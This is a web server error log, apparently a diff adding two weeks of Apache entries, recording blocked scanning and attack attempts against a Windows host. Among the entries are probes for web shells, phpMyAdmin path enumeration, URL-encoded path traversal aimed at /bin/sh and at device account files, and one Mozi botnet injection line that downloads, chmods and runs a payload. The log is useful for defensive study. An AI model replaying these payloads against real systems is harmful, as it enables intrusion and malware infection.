+[Sat Jun 03 20:33:49.066726 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat Jun 03 20:47:30.201072 2023] [:error] [pid 4952:tid 1420] [client 64.227.9.15:51340] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat Jun 03 20:47:30.581229 2023] [:error] [pid 4952:tid 1420] [client 64.227.9.15:51388] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sun Jun 04 09:43:55.737272 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun Jun 04 11:18:28.055728 2023] [:error] [pid 4952:tid 1396] [client 64.227.146.243:59840] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/human.php' not found or unable to stat
+[Sun Jun 04 11:18:35.691690 2023] [:error] [pid 4952:tid 1396] [client 64.227.146.243:53208] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/human2.php' not found or unable to stat
+[Sun Jun 04 11:18:42.068715 2023] [:error] [pid 4952:tid 1396] [client 64.227.146.243:53210] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/Eetie0ph.php' not found or unable to stat
+[Sun Jun 04 12:56:32.204086 2023] [core:error] [pid 4952:tid 1396] [client 83.97.73.89:60860] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Sun Jun 04 17:33:07.756942 2023] [:error] [pid 4952:tid 1396] [client 159.65.128.136:53880] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun Jun 04 17:33:10.489679 2023] [:error] [pid 4952:tid 1396] [client 159.65.128.136:53896] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sun Jun 04 23:18:12.551135 2023] [:error] [pid 4952:tid 1420] [client 68.183.82.186:59154] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sun Jun 04 23:18:15.049648 2023] [:error] [pid 4952:tid 1420] [client 68.183.82.186:59196] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Mon Jun 05 10:10:08.094807 2023] [:error] [pid 4952:tid 1396] [client 185.224.128.114:39806] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/home.php' not found or unable to stat
+[Mon Jun 05 19:59:31.446567 2023] [:error] [pid 4952:tid 1396] [client 167.99.206.14:38482] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Mon Jun 05 19:59:32.553521 2023] [:error] [pid 4952:tid 1396] [client 167.99.206.14:38518] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Tue Jun 06 01:33:15.153961 2023] [:error] [pid 4952:tid 1396] [client 185.224.128.114:40884] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/home.php' not found or unable to stat
+[Tue Jun 06 05:19:34.870374 2023] [core:error] [pid 4952:tid 1396] [client 83.97.73.89:36640] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Tue Jun 06 07:34:41.503186 2023] [:error] [pid 4952:tid 1396] [client 142.93.163.69:38420] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Tue Jun 06 07:34:42.614905 2023] [:error] [pid 4952:tid 1396] [client 142.93.163.69:38454] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Tue Jun 06 09:59:44.594067 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Tue Jun 06 19:42:34.258659 2023] [:error] [pid 4952:tid 1396] [client 35.216.229.26:46036] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/info.php' not found or unable to stat
+[Tue Jun 06 21:56:13.258478 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Tue Jun 06 21:56:13.992631 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Tue Jun 06 21:56:15.206406 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Tue Jun 06 21:56:21.488361 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Tue Jun 06 21:56:21.731240 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Tue Jun 06 21:56:23.174299 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/index.php
+[Tue Jun 06 21:56:23.897744 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44727] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Tue Jun 06 21:56:27.687967 2023] [authz_core:error] [pid 4952:tid 1396] [client 77.240.99.157:44997] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Tue Jun 06 23:06:56.075035 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Wed Jun 07 10:43:32.848482 2023] [core:error] [pid 4952:tid 1420] [client 83.97.73.89:53244] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Wed Jun 07 15:42:50.086004 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Wed Jun 07 15:42:50.225939 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/dbadmin
+[Wed Jun 07 15:42:51.202776 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Wed Jun 07 15:42:52.174538 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Wed Jun 07 15:42:55.646228 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Wed Jun 07 15:42:58.143520 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Wed Jun 07 15:42:58.421976 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:41026] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/mysqlmanager
+[Wed Jun 07 15:43:02.317253 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:44244] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Wed Jun 07 15:43:03.712053 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:44244] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/index.php
+[Wed Jun 07 15:43:04.683548 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:44244] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/mysqlmanager
+[Wed Jun 07 15:43:04.823548 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:44244] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Wed Jun 07 15:43:04.961835 2023] [authz_core:error] [pid 4952:tid 1420] [client 77.120.3.197:44244] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Wed Jun 07 17:06:13.311293 2023] [:error] [pid 4952:tid 1396] [client 138.68.171.122:48560] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed Jun 07 17:06:14.350870 2023] [:error] [pid 4952:tid 1396] [client 138.68.171.122:57638] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Wed Jun 07 21:27:06.633936 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Wed Jun 07 21:27:06.719394 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Wed Jun 07 21:27:07.995860 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Wed Jun 07 21:27:08.366063 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/index.php
+[Wed Jun 07 21:27:08.565492 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/mysqlmanager
+[Wed Jun 07 21:27:08.794116 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Wed Jun 07 21:27:08.935401 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Wed Jun 07 21:27:09.160995 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:36030] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/dbadmin
+[Wed Jun 07 21:27:09.834905 2023] [authz_core:error] [pid 4952:tid 1420] [client 129.159.68.205:45176] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Thu Jun 08 01:37:58.484201 2023] [:error] [pid 4952:tid 1420] [client 170.64.156.128:42312] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Thu Jun 08 01:38:00.693489 2023] [:error] [pid 4952:tid 1420] [client 170.64.156.128:42360] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Thu Jun 08 12:10:00.938642 2023] [:error] [pid 4952:tid 1420] [client 206.189.196.231:39910] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Thu Jun 08 12:10:01.301174 2023] [:error] [pid 4952:tid 1420] [client 206.189.196.231:39964] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Thu Jun 08 13:22:33.217952 2023] [core:error] [pid 4952:tid 1420] [client 83.97.73.89:44830] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Thu Jun 08 19:36:43.791839 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu Jun 08 23:00:43.688055 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Thu Jun 08 23:00:45.485635 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/index.php
+[Thu Jun 08 23:00:45.648415 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/dbadmin
+[Thu Jun 08 23:00:47.443572 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Thu Jun 08 23:00:48.912424 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/admin
+[Thu Jun 08 23:00:51.334090 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Thu Jun 08 23:00:53.455879 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Thu Jun 08 23:00:53.781808 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Thu Jun 08 23:00:56.552171 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:43700] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/web
+[Thu Jun 08 23:01:01.246978 2023] [authz_core:error] [pid 4952:tid 1348] [client 88.247.67.155:45374] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Fri Jun 09 02:17:57.770927 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 09 15:42:46.835759 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 09 17:13:13.489194 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 09 22:41:40.066049 2023] [core:error] [pid 4952:tid 1380] [client 83.97.73.89:37288] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Fri Jun 09 22:43:58.247496 2023] [:error] [pid 4952:tid 1380] [client 134.209.42.122:45370] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Fri Jun 09 22:43:58.593454 2023] [:error] [pid 4952:tid 1380] [client 134.209.42.122:45422] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat Jun 10 00:59:44.513148 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sat Jun 10 04:13:54.359107 2023] [:error] [pid 4952:tid 1348] [client 159.203.94.154:48176] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat Jun 10 04:13:54.742227 2023] [:error] [pid 4952:tid 1348] [client 159.203.94.154:48216] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat Jun 10 12:56:23.890106 2023] [:error] [pid 4952:tid 1380] [client 178.128.51.88:46132] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat Jun 10 12:56:26.450964 2023] [:error] [pid 4952:tid 1380] [client 178.128.51.88:46174] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sat Jun 10 18:50:26.694511 2023] [:error] [pid 4952:tid 1380] [client 165.22.192.252:46350] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Sat Jun 10 18:50:27.714558 2023] [:error] [pid 4952:tid 1380] [client 165.22.192.252:46410] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Sun Jun 11 00:25:39.762689 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun Jun 11 01:37:51.892414 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Sun Jun 11 02:21:35.379850 2023] [:error] [pid 4952:tid 1380] [client 5.188.210.227:35986] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Jun 11 02:31:47.235918 2023] [:error] [pid 4952:tid 1380] [client 132.145.39.16:38104] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/phpinfo.php' not found or unable to stat
+[Sun Jun 11 02:31:49.325314 2023] [:error] [pid 4952:tid 1380] [client 132.145.39.16:59386] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/info.php' not found or unable to stat
+[Sun Jun 11 02:31:50.894175 2023] [:error] [pid 4952:tid 1380] [client 132.145.39.16:12248] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/php.php' not found or unable to stat
+[Sun Jun 11 02:31:52.461086 2023] [:error] [pid 4952:tid 1380] [client 132.145.39.16:49979] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/test.php' not found or unable to stat
+[Sun Jun 11 04:32:10.345944 2023] [core:error] [pid 4952:tid 1380] [client 83.97.73.89:58872] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Sun Jun 11 22:08:47.272355 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Mon Jun 12 00:04:40.557406 2023] [core:error] [pid 4952:tid 1380] [client 45.156.129.12:50998] AH00126: Invalid URI in request HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1
+[Mon Jun 12 02:24:30.890768 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Mon Jun 12 02:24:32.141992 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/sqlmanager
+[Mon Jun 12 02:24:32.891394 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Mon Jun 12 02:24:34.270511 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/mysqlmanager
+[Mon Jun 12 02:24:35.525229 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/dbadmin
+[Mon Jun 12 02:24:35.650227 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Mon Jun 12 02:24:39.266501 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:48550] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/db
+[Mon Jun 12 02:24:43.908014 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:49764] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pMA
+[Mon Jun 12 02:24:44.513141 2023] [authz_core:error] [pid 4952:tid 1348] [client 77.12.190.2:49764] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/pma
+[Mon Jun 12 10:08:51.578910 2023] [core:error] [pid 4952:tid 1348] [client 83.97.73.89:33120] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Tue Jun 13 07:26:46.508821 2023] [core:error] [pid 4952:tid 1348] [client 193.32.162.190:34432] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account1 HTTP/1.1
+[Tue Jun 13 08:17:02.790117 2023] [core:error] [pid 4952:tid 1348] [client 193.32.162.190:42302] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account2 HTTP/1.1
+[Tue Jun 13 17:15:55.220139 2023] [core:error] [pid 4952:tid 1348] [client 83.97.73.89:44668] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Wed Jun 14 04:01:51.065370 2023] [core:error] [pid 4952:tid 1380] [client 147.182.145.177:34606] AH00126: Invalid URI in request \xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff
+[Wed Jun 14 05:57:32.599851 2023] [:error] [pid 4952:tid 1380] [client 71.210.130.110:52227] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/main.php' not found or unable to stat, referer: http://76.64.125.111/
+[Wed Jun 14 05:57:37.852245 2023] [authz_core:error] [pid 4952:tid 1380] [client 71.210.130.110:35616] AH01630: client denied by server configuration: C:/Galaxseeds/Galaxseeds/Web Server/phpapps/phpmyadmin/, referer: http://76.64.125.111/
+[Wed Jun 14 06:41:19.405227 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:36178] AH00126: Invalid URI in request POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 06:41:35.780688 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:52324] AH00126: Invalid URI in request POST /assets/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 06:41:37.756643 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:40204] AH00126: Invalid URI in request POST /js/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 06:41:40.343103 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:58386] AH00126: Invalid URI in request POST /css/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 14:29:02.094954 2023] [core:error] [pid 4952:tid 1348] [client 185.65.135.140:57416] AH00126: Invalid URI in request POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 14:29:03.925151 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:33798] AH00126: Invalid URI in request POST /assets/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 14:29:04.755007 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:35818] AH00126: Invalid URI in request POST /js/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 14:29:05.598370 2023] [core:error] [pid 4952:tid 1380] [client 185.65.135.140:37966] AH00126: Invalid URI in request POST /css/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+[Wed Jun 14 17:37:08.335869 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Wed Jun 14 20:17:12.836308 2023] [core:error] [pid 4952:tid 1348] [client 117.216.1.145:57759] AH00126: Invalid URI in request 27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0
+[Wed Jun 14 21:23:47.768062 2023] [:error] [pid 4952:tid 1348] [client 170.64.142.72:45162] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Wed Jun 14 21:23:48.244713 2023] [:error] [pid 4952:tid 1348] [client 170.64.142.72:45176] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Thu Jun 15 01:28:33.783508 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu Jun 15 01:51:45.546005 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Thu Jun 15 03:10:27.785799 2023] [:error] [pid 4952:tid 1380] [client 159.65.4.198:54660] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Thu Jun 15 03:10:30.420673 2023] [:error] [pid 4952:tid 1380] [client 159.65.4.198:50062] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Thu Jun 15 03:21:47.823764 2023] [core:error] [pid 4952:tid 1380] [client 83.97.73.89:57842] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Thu Jun 15 16:17:45.764533 2023] [core:error] [pid 4952:tid 1408] [client 111.85.200.168:53118] AH00126: Invalid URI in request USER anonymous
+[Thu Jun 15 22:09:01.398447 2023] [core:error] [pid 4952:tid 1364] [client 193.32.162.190:55730] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account1 HTTP/1.1
+[Thu Jun 15 23:05:39.004438 2023] [core:error] [pid 4952:tid 1364] [client 193.32.162.190:48506] AH00126: Invalid URI in request GET /../../mnt/mtd/Config/Account2 HTTP/1.1
+[Fri Jun 16 02:32:29.236897 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 16 07:15:48.061133 2023] [core:error] [pid 4952:tid 1332] [client 83.97.73.89:57458] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Fri Jun 16 08:22:21.306331 2023] [:error] [pid 4952:tid 1364] [client 134.209.19.200:35572] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/upl.php' not found or unable to stat
+[Fri Jun 16 08:22:22.359330 2023] [:error] [pid 4952:tid 1364] [client 134.209.19.200:35616] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/1.php' not found or unable to stat
+[Fri Jun 16 12:56:06.341956 2023] [mpm_winnt:warn] [pid 4952:tid 1676] (OS 64)The specified network name is no longer available.  : AH00341: winnt_accept: Asynchronous AcceptEx failed.
+[Fri Jun 16 15:35:47.683636 2023] [:error] [pid 4952:tid 1364] [client 202.112.51.4:42320] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/c77dba7b-cdaa-49be-ab26-609404677395.php' not found or unable to stat
+[Fri Jun 16 22:48:05.504140 2023] [:error] [pid 4952:tid 1348] [client 202.112.51.4:56198] script 'C:/Galaxseeds/Galaxseeds/Web Server/www/f40441ce-0fcd-42f5-bd14-410c252a7079.php' not found or unable to stat
